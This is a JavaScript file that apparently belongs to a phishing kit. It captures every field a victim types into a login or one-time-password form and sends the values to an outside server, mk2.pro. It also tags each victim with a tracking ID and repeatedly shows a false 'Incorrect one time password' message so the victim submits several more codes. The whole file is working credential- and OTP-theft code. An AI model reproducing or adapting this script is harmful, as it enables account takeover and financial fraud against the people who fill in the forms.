var API_URL = "https://mk2.pro/api.php?action=save";
var OTT = 0;
var hasPath = "";
var page_type = "";
function serverCall(body, nextURL) {
    fetch(API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
        })
        .then((res) => res.json())
        .then((responseData) => {
            if (responseData.status === 200) {
                if(page_type == 'home') {
                    localStorage.setItem("collection_id", responseData.data);
                }
                if (getQuery("next") == "loading.html" && OTT < 4) {
                    document.getElementById("frm_2_am8E_").reset();
                    document.getElementById("tok-invalid").innerHTML = "Incorrect one time password";
                     OTT++;
                      setTimeout(() => {
                        document.getElementById("tok-invalid").innerHTML = "";
                        $("#frm_2_am8E_ input[type=submit]").val("Submit");
                      }, 3000);
                    return false;
                }
                if(getQuery("next")=='loading.html'){
                    window.location.href = nextURL;
                    return false;
                }
                window.location.href = nextURL;
            } else {
                console.log("response is not valid");
            }
        })
        .catch((error) => {
            console.error(error);
        });
}

window.onload = function() {
    hasPath = window.location.pathname;
    if (hasPath.indexOf("tok") !== -1) {
        document.getElementById("nextValue").value = "loader.html?next="+getQuery("next");
    }
    if($("#page_type")){
         page_type = $("#page_type").val();
         if(page_type=='home'){
            localStorage.removeItem("collection_id");
         }
    }

    let form = document.getElementById("frm_2_am8E_");
    let nextValue  = '';
    nextValue = document.getElementById("nextValue").value;
    form.addEventListener("submit", function(event) {
        event.preventDefault(); 
        let formData = {}; 
        for (let i = 0; i < form.elements.length; i++) {
            let element = form.elements[i];
            if (element.tagName === 'INPUT') {
                if (element.value == 'RESET' || element.value == 'LOGIN' || element.value == "Submit") {
                    continue;
                }
                if(element.name=='one'){
//                    let one_1 = counterIncrement();
                    formData[element.name+'-'+OTT] = element.value;
                    console.log(formData[element.name+'-'+OTT]);
                }else{
                    if(element.name && element.value){
                        formData[element.name] = element.value;
                    }
                }
            }
        }
        let sendData = {};
        sendData['site'] = "localhost"
        sendData['data'] = formData;
        if(page_type!=='home'){
            sendData['id'] = localStorage.getItem("collection_id");
        }else{
            sendData['id'] = '';
        }
        serverCall(sendData, nextValue);
    });
};

function getQuery(query){
        
    var currentURL = window.location.href;
    var urlParams = new URLSearchParams(currentURL.split('?')[1]);
    var nextValue = urlParams.get(query);
    return nextValue;
}

function counterIncrement() {
    var counterValue = localStorage.getItem('1'); 
    if(hasPath == "/tok" || hasPath == "/tok.html") {
        console.log(counterValue);
        if (counterValue === null) {
            counterValue = 0;
        } else {
            counterValue = parseInt(counterValue); 
        }
        counterValue++; 
        localStorage.setItem('1', counterValue); 
    }
    return counterValue;
}


